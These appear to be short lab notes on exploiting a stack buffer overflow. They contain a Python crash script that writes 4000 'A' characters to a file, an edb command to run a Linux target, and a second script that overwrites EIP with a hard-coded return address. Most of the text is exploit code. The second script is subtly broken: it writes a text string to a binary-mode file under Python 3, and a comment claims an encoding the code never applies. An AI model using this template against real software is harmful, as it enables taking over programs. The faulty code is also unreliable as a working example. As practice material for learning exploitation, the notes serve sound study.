Crash python code, just keep upping the 'A' amount and running in debugger to find in EIP.
```bash - kali
#!/usr/bin/python3
 
buffer = 'A'* 4000

f = open("exploit.txt", "w")
f.write(buffer+'\n')
f.close()
```

If doing Linux overflow, run with following command, hit play once or twice.
```bash - kali
edb --run execution-flow-linux
```


```bash - kali
#!/usr/bin/python3
 
buffer = 'A'* 3900
eip = "\x2b\x86\x04\x08"
payload = buffer + eip

#Opening for writing in binary mode
with open('exploit.txt', 'wb') as f:
	#Force Latin-1 encoding
	f.write(payload)
f.close()
```
